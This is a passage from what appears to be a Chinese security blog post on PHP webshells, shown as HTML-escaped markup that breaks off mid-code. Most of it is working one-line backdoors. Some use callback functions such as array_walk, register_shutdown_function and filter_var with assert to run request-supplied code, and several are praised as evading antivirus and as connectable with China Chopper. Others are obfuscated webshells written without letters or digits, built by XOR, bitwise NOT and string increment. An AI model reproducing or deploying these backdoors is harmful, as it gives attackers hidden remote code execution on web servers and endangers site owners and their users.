&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$e = $_REQUEST[&amp;#x27;e&amp;#x27;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$arr = array(1);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;array_reduce($arr, $e, $_POST[&amp;#x27;pass&amp;#x27;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$e = $_REQUEST[&amp;#x27;e&amp;#x27;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$arr = array($_POST[&amp;#x27;pass&amp;#x27;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$arr2 = array(1);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;array_udiff($arr, $arr2, $e);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;以上几个都是可以直接菜刀连接的一句话，但目标 PHP 版本在 5.4.8 及以上才可用。&lt;/p&gt;
&lt;p&gt;我把上面几个类型归为：二参数回调函数（也就是回调函数的格式是需要两个参数的）&lt;/p&gt;
&lt;h3 id=&#34;0x04-三参数回调函数&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#0x04-三参数回调函数&#34;&gt;#&lt;/a&gt; 0x04 三参数回调函数&lt;/h3&gt;
&lt;p&gt;有些函数需要的回调函数类型比较苛刻，回调格式需要三个参数。比如 array_walk。&lt;/p&gt;
&lt;p&gt;array_walk 的第二个参数是 callable 类型，正常情况下它是格式是两个参数的，但在 0x03 中说了，两个参数的回调后门需要使用 php5.4.8 后的 assert，在 5.3 就不好用了。但这个回调其实也可以接受三个参数，那就好办了：&lt;/p&gt;
&lt;p&gt;php 中，可以执行代码的函数：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;一个参数：assert&lt;/li&gt;
&lt;li&gt;两个参数：assert （php5.4.8+）&lt;/li&gt;
&lt;li&gt;三个参数：preg_replace /e 模式&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;三个参数可以用 preg_replace。所以我这里构造了一个 array_walk + preg_replace 的回调后门：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$e = $_REQUEST[&amp;#x27;e&amp;#x27;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$arr = array($_POST[&amp;#x27;pass&amp;#x27;] =&amp;gt; &amp;#x27;|.*|e&amp;#x27;,);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;array_walk($arr, $e, &amp;#x27;&amp;#x27;);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;PHP 拥有那么多灵活的函数，稍微改个函数（array_walk_recursive）&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$e = $_REQUEST[&amp;#x27;e&amp;#x27;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$arr = array($_POST[&amp;#x27;pass&amp;#x27;] =&amp;gt; &amp;#x27;|.*|e&amp;#x27;,);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;array_walk_recursive($arr, $e, &amp;#x27;&amp;#x27;);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;其实 php 里不止这个函数可以执行 eval 的功能，还有几个类似的：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mb_ereg_replace(&amp;#x27;.*&amp;#x27;, $_REQUEST[&amp;#x27;pass&amp;#x27;], &amp;#x27;&amp;#x27;, &amp;#x27;e&amp;#x27;);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;另一个：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo preg_filter(&amp;#x27;|.*|e&amp;#x27;, $_REQUEST[&amp;#x27;pass&amp;#x27;], &amp;#x27;&amp;#x27;);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;0x05-单参数后门终极奥义&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#0x05-单参数后门终极奥义&#34;&gt;#&lt;/a&gt; 0x05 单参数后门终极奥义&lt;/h3&gt;
&lt;p&gt;preg_replace、三参数后门虽然好用，但 /e 模式 php5.5 以后就废弃了，不知道哪天就会给删了。所以我觉得还是单参数后门，在各个版本都比较好驾驭。&lt;/p&gt;
&lt;p&gt;这里给出几个好用不杀的回调后门&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$e = $_REQUEST[&amp;#x27;e&amp;#x27;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;register_shutdown_function($e, $_REQUEST[&amp;#x27;pass&amp;#x27;]);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;这个是 php 全版本支持的，且不报不杀稳定执行：&lt;/p&gt;
&lt;p&gt;再来一个：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$e = $_REQUEST[&amp;#x27;e&amp;#x27;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;declare(ticks=1);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;register_tick_function ($e, $_REQUEST[&amp;#x27;pass&amp;#x27;]);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;再来两个：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;filter_var($_REQUEST[&amp;#x27;pass&amp;#x27;], FILTER_CALLBACK, array(&amp;#x27;options&amp;#x27; =&amp;gt; &amp;#x27;assert&amp;#x27;));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;filter_var_array(array(&amp;#x27;test&amp;#x27; =&amp;gt; $_REQUEST[&amp;#x27;pass&amp;#x27;]), array(&amp;#x27;test&amp;#x27; =&amp;gt; array(&amp;#x27;filter&amp;#x27; =&amp;gt; FILTER_CALLBACK, &amp;#x27;options&amp;#x27; =&amp;gt; &amp;#x27;assert&amp;#x27;)));&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;这两个是 filter_var 的利用，php 里用这个函数来过滤数组，只要指定过滤方法为回调（FILTER_CALLBACK），且 option 为 assert 即可。&lt;/p&gt;
&lt;p&gt;这几个单参数回调后门非常隐蔽，基本没特征&lt;/p&gt;
&lt;h3 id=&#34;0x06-其他参数型回调后门&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#0x06-其他参数型回调后门&#34;&gt;#&lt;/a&gt; 0x06 其他参数型回调后门&lt;/h3&gt;
&lt;p&gt;上面说了，回调函数格式为 1、2、3 参数的时候，可以利用 assert、assert、preg_replace 来执行代码。但如果回调函数的格式是其他参数数目，或者参数类型不是简单字符串，怎么办？&lt;/p&gt;
&lt;p&gt;举个例子，php5.5 以后建议用 preg_replace_callback 代替 preg_replace 的 /e 模式来处理正则执行替换，那么其实 preg_replace_callback 也是可以构造回调后门的。&lt;/p&gt;
&lt;p&gt;preg_replace_callback 的第二个参数是回调函数，但这个回调函数被传入的参数是一个数组，如果直接将这个指定为 assert，就会执行不了，因为 assert 接受的参数是字符串。&lt;/p&gt;
&lt;p&gt;所以我们需要去 “构造” 一个满足条件的回调函数。&lt;/p&gt;
&lt;p&gt;怎么构造？使用 create_function：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;preg_replace_callback(&amp;#x27;/.+/i&amp;#x27;, create_function(&amp;#x27;$arr&amp;#x27;, &amp;#x27;return assert($arr[0]);&amp;#x27;), $_REQUEST[&amp;#x27;pass&amp;#x27;]);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;“创造” 一个函数，它接受一个数组，并将数组的第一个元素 $arr [0] 传入 assert。&lt;/p&gt;
&lt;p&gt;这也是一个不杀不报稳定执行的回调后门，但因为有 create_function 这个敏感函数，所以看起来总是不太爽。不过也是没办法的事。&lt;/p&gt;
&lt;p&gt;类似的，这个也同样：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mb_ereg_replace_callback(&amp;#x27;.+&amp;#x27;, create_function(&amp;#x27;$arr&amp;#x27;, &amp;#x27;return assert($arr[0]);&amp;#x27;), $_REQUEST[&amp;#x27;pass&amp;#x27;]);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;一些不包含数字和字母的webshell&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#一些不包含数字和字母的webshell&#34;&gt;#&lt;/a&gt; 一些不包含数字和字母的 webshell&lt;/h2&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;if(!preg_match(&amp;#x27;/[a-z0-9]/is&amp;#x27;,$_GET[&amp;#x27;shell&amp;#x27;])) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  eval($_GET[&amp;#x27;shell&amp;#x27;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;核心思路是，将非字母、数字的字符经过各种变换，最后能构造出 a-z 中任意一个字符。然后再利用 PHP 允许动态函数执行的特点，拼接处一个函数名，如 “assert”，然后动态执行之即可。&lt;/p&gt;
&lt;p&gt;那么，&lt;strong&gt;变换方法&lt;/strong&gt; 将是解决本题的要点。&lt;/p&gt;
&lt;p&gt;不过在此之前，我需要说说 php5 和 7 的差异。&lt;/p&gt;
&lt;p&gt;php5 中 assert 是一个函数，我们可以通过 &lt;code&gt;$f=&#39;assert&#39;;$f(...);&lt;/code&gt;  这样的方法来动态执行任意代码。&lt;/p&gt;
&lt;p&gt;但 php7 中，assert 不再是函数，变成了一个语言结构（类似 eval），不能再作为函数名动态执行代码，所以利用起来稍微复杂一点。但也无需过于担心，比如我们利用 file_put_contents 函数，同样可以用来 getshell。&lt;/p&gt;
&lt;h3 id=&#34;方法一&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#方法一&#34;&gt;#&lt;/a&gt; 方法一&lt;/h3&gt;
&lt;p&gt;这是最简单、最容易想到的方法。在 PHP 中，两个字符串执行异或操作以后，得到的还是一个字符串。所以，我们想得到 a-z 中某个字母，就找到某两个非字母、数字的字符，他们的异或结果是这个字母即可。&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$_=(&amp;#x27;%01&amp;#x27;^&amp;#x27;`&amp;#x27;).(&amp;#x27;%13&amp;#x27;^&amp;#x27;`&amp;#x27;).(&amp;#x27;%13&amp;#x27;^&amp;#x27;`&amp;#x27;).(&amp;#x27;%05&amp;#x27;^&amp;#x27;`&amp;#x27;).(&amp;#x27;%12&amp;#x27;^&amp;#x27;`&amp;#x27;).(&amp;#x27;%14&amp;#x27;^&amp;#x27;`&amp;#x27;); // $_=&amp;#x27;assert&amp;#x27;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$__=&amp;#x27;_&amp;#x27;.(&amp;#x27;%0D&amp;#x27;^&amp;#x27;]&amp;#x27;).(&amp;#x27;%2F&amp;#x27;^&amp;#x27;`&amp;#x27;).(&amp;#x27;%0E&amp;#x27;^&amp;#x27;]&amp;#x27;).(&amp;#x27;%09&amp;#x27;^&amp;#x27;]&amp;#x27;); // $__=&amp;#x27;_POST&amp;#x27;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$___=$$__;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$_($___[_]); // assert($_POST[_]);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221222161730587.png&#34; alt=&#34;image-20221222161730587&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;方法二&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#方法二&#34;&gt;#&lt;/a&gt; 方法二&lt;/h3&gt;
&lt;p&gt;和方法一有异曲同工之妙，唯一差异就是，方法一使用的是位运算里的 “异或”，方法二使用的是位运算里的 “取反”。&lt;/p&gt;
&lt;p&gt;方法二利用的是 UTF-8 编码的某个汉字，并将其中某个字符取出来，比如 &lt;code&gt;&#39;和&#39;&amp;#123;2&amp;#125;&lt;/code&gt;  的结果是 &lt;code&gt;&amp;quot;\x8c&amp;quot;&lt;/code&gt; ，其取反即为字母 &lt;code&gt;s&lt;/code&gt; ：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221222161822603.png&#34; alt=&#34;image-20221222161822603&#34;&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$__=(&amp;#x27;&amp;gt;&amp;#x27;&amp;gt;&amp;#x27;&amp;lt;&amp;#x27;)+(&amp;#x27;&amp;gt;&amp;#x27;&amp;gt;&amp;#x27;&amp;lt;&amp;#x27;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$_=$__/$__;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$____=&amp;#x27;&amp;#x27;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$___=&amp;quot;瞰&amp;quot;;$____.=~($___&amp;#123;$_&amp;#125;);$___=&amp;quot;和&amp;quot;;$____.=~($___&amp;#123;$__&amp;#125;);$___=&amp;quot;和&amp;quot;;$____.=~($___&amp;#123;$__&amp;#125;);$___=&amp;quot;的&amp;quot;;$____.=~($___&amp;#123;$_&amp;#125;);$___=&amp;quot;半&amp;quot;;$____.=~($___&amp;#123;$_&amp;#125;);$___=&amp;quot;始&amp;quot;;$____.=~($___&amp;#123;$__&amp;#125;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$_____=&amp;#x27;_&amp;#x27;;$___=&amp;quot;俯&amp;quot;;$_____.=~($___&amp;#123;$__&amp;#125;);$___=&amp;quot;瞰&amp;quot;;$_____.=~($___&amp;#123;$__&amp;#125;);$___=&amp;quot;次&amp;quot;;$_____.=~($___&amp;#123;$_&amp;#125;);$___=&amp;quot;站&amp;quot;;$_____.=~($___&amp;#123;$_&amp;#125;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$_=$$_____;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$____($_[$__]);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221222161952864.png&#34; alt=&#34;image-20221222161952864&#34;&gt;&lt;/p&gt;
&lt;p&gt;这个答案还利用了 PHP 的弱类型特性。因为要获取 &lt;code&gt;&#39;和&#39;&amp;#123;2&amp;#125;&lt;/code&gt; ，就必须有数字 2。而 PHP 由于弱类型这个特性，true 的值为 1，故 &lt;code&gt;true+true==2&lt;/code&gt; ，也就是 &lt;code&gt;(&#39;&amp;gt;&#39;&amp;gt;&#39;&amp;lt;&#39;)+(&#39;&amp;gt;&#39;&amp;gt;&#39;&amp;lt;&#39;)==2&lt;/code&gt; 。&lt;/p&gt;
&lt;h3 id=&#34;方法三&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#方法三&#34;&gt;#&lt;/a&gt; 方法三&lt;/h3&gt;
&lt;p&gt;这就得借助 PHP 的一个小技巧，先看文档： &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3BocC5uZXQvbWFudWFsL3poL2xhbmd1YWdlLm9wZXJhdG9ycy5pbmNyZW1lbnQucGhw&#34;&gt;http://php.net/manual/zh/language.operators.increment.php&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221222162055456.png&#34; alt=&#34;image-20221222162055456&#34;&gt;&lt;/p&gt;
&lt;p&gt;也就是说， &lt;code&gt;&#39;a&#39;++ =&amp;gt; &#39;b&#39;&lt;/code&gt; ， &lt;code&gt;&#39;b&#39;++ =&amp;gt; &#39;c&#39;&lt;/code&gt; … 所以，我们只要能拿到一个变量，其值为 &lt;code&gt;a&lt;/code&gt; ，通过自增操作即可获得 a-z 中所有字符。&lt;/p&gt;
&lt;p&gt;那么，如何拿到一个值为字符串’a’的变量呢？&lt;/p&gt;
&lt;p&gt;巧了，数组（Array）的第一个字母就是大写 A，而且第 4 个字母是小写 a。也就是说，我们可以同时拿到小写和大写 A，等于我们就可以拿到 a-z 和 A-Z 的所有字母。&lt;/p&gt;
&lt;p&gt;在 PHP 中，如果强制连接数组和字符串的话，数组将被转换成字符串，其值为 &lt;code&gt;Array&lt;/code&gt; ：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221222162132570.png&#34; alt=&#34;image-20221222162132570&#34;&gt;&lt;/p&gt;
&lt;p&gt;再取这个字符串的第一个字母，就可以获得’A’了。&lt;/p&gt;
&lt;p&gt;利用这个技巧，我编写了如下 webshell（因为 PHP 函数是大小写不敏感的，所以我们最终执行的是 &lt;code&gt;ASSERT($_POST[_])&lt;/code&gt; ，无需获取小写 a）：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span 